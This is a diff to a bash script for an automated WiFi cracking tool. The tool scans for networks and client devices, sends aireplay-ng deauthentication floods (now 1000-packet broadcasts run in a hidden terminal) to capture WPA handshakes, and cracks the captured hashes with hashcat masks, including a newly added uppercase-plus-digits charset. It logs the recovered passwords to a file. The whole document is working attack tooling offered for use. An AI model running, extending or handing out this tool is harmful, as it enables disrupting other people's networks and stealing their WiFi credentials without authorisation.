@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.2 18/1/25 05:26
+# version: 3.2.1 19/1/25 02:40
 
 
 ### To Do ###
@@ -247,10 +247,6 @@ function network_scanner() {
 }
 
 
-
-# ------------------------------
-# Select Network
-# ------------------------------
 function choose_network() {
     while :; do
         # Prompt the user to choose a row number
@@ -281,13 +277,14 @@ function choose_network() {
 
         # Remove "/" from bssid name
         if [[ $bssid_name == *"/"* ]]; then
+            bssid_name_original=${bssid_name}
             bssid_name=${bssid_name//\//}
         fi
 
         get_oui_vendor
 
         # Echo values
-        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
+        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name_original"
         if [[ -n "$oui_vendor" ]]; then
             echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address - $oui_vendor"
         else
@@ -413,7 +410,8 @@ function get_oui_vendor() {
 # ------------------------------
 function devices_scanner() {
 	echo -e "\e[1m\nStart scanning for devices ->>\e[0m"
-	for ((i=1; i<=10; i++)); do
+	sleep 2
+	for ((i=1; i<=20; i++)); do
 	    target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
 	    if [ -n "$target_devices" ]; then
 		# Print Devices_Found with vendor names
@@ -433,7 +431,7 @@ function devices_scanner() {
 		break
 	    fi
 	    echo -e "Scanning for devices..  \e[1;34m$i/10\e[0m"
-	    sleep 6
+	    sleep 3
 	done
 	if [ -z "$target_devices" ]; then
 	    echo -e "\033[1m\nNo device were found.\033[0m"
@@ -441,7 +439,7 @@ function devices_scanner() {
 	    rm -r $targets_path/"$bssid_name"
 	    another_scan_prompt
 	fi
-	sleep 3
+	sleep 2
 }
 
 
@@ -454,9 +452,11 @@ function deauth_attack() {
 	    # trying 10 times (3 minutes) the deauth attack
 	    for ((i=1; i<=10; i++)); do        
 		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
-		for target_device in $target_devices; do
-		    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
-		done		
+		#for target_device in $target_devices; do
+		#    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
+		#done
+		gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
+		
 		echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         			
 		# Print MAC addresses with vendor names
 		echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
@@ -481,9 +481,7 @@ function deauth_attack() {
 			sudo pkill airodump-ng
 			echo
 			echo --- >> $targets_path/wifi_passwords.txt
-			#echo -e "We got handshake for ($bssid_address): $bssid_name                       at $(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
 			printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
-
 			break 2
 		    fi    
 		done
@@ -509,7 +507,7 @@ function dictionary_attack() {
 	echo
 	if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
 	    wifi_pass=$(cat "$targets_path/$bssid_name/$bssid_name-wifi_password.txt")
-	    echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
+	    echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
 	    bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
             sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
             rm -r $targets_path/"$bssid_name" 
@@ -532,6 +530,8 @@ function dictionary_attack() {
 	     esac 	    
 	fi
 }
+
+
 
 
 # ------------------------------
@@ -577,7 +577,8 @@ function hashcat_crack() {
             echo "  3) Numbers               - ?d -   (123)"
             echo "  4) Special character     - ?s -   (!@#)"
             echo "  5) All character types   - ?a -   (ABC-abc-123-!@#)"
-            echo "  6) Enter a specific character:__"
+            echo "  6) Uppercase + Numbers   - ?u?d - (ABC-123)"
+            echo "  7) Enter a specific character:__"
             echo -e "\n\n\n"
 
             # Initialize an array for current positions
@@ -591,7 +592,7 @@ function hashcat_crack() {
                 
                 # Prompt for position choice
                 while true; do
-                    read -p "Choose an option for position $i (1-6): " choice
+                    read -p "Choose an option for position $i (1-7): " choice
 
                     case "$choice" in
                         1) positions+=("?u"); break;; 
@@ -599,7 +600,11 @@ function hashcat_crack() {
                         3) positions+=("?d"); break;;
                         4) positions+=("?s"); break;;
                         5) positions+=("?a"); break;;
-                        6) 
+                        6)                             
+                            positions+=("?1")  # Adding the custom charset for Uppercase + Numbers
+                            charset="-1 ?u?d"   # Define the custom charset
+                            break;;                                                          
+                        7) 
                             read -p "  Enter the specific character for position $i: " specific_char
                             if [[ ${#specific_char} -eq 1 ]]; then
                                 positions+=("$specific_char")
@@ -609,7 +614,6 @@ function hashcat_crack() {
                                 echo "You must enter exactly one character."
                                 tput cuu1; tput el
                             fi
-                            
                             ;;
                         *) echo "Invalid choice. Please enter a valid option."
                            tput cuu1; tput el; tput cuu1; tput el;;
@@ -623,14 +627,20 @@ function hashcat_crack() {
         fi
     done
     
-    echo -e "\033[1;33mGenerated mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"
+    echo -e "\n\n\033[1;33mGenerated mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"
     echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\n\e[0m\n"
-    hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --potfile-disable
-        
+
+    # Run hashcat with the correct options
+    if [[ -n "$charset" ]]; then
+        hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --potfile-disable
+    else
+        hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --potfile-disable
+    fi
+           
     echo
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
-        wifi_pass=$(grep "$bssid_name" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name:" '{print $2}')
-        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
+        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
+        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r $targets_path/"$bssid_name" 
@@ -653,6 +663,8 @@ function hashcat_crack() {
 	esac        
     fi
 }
+
+
 
 
 # ------------------------------
@@ -743,4 +755,6 @@ install_dependencies
 check_wordlist
 adapter_config
 main_process
+
+
 
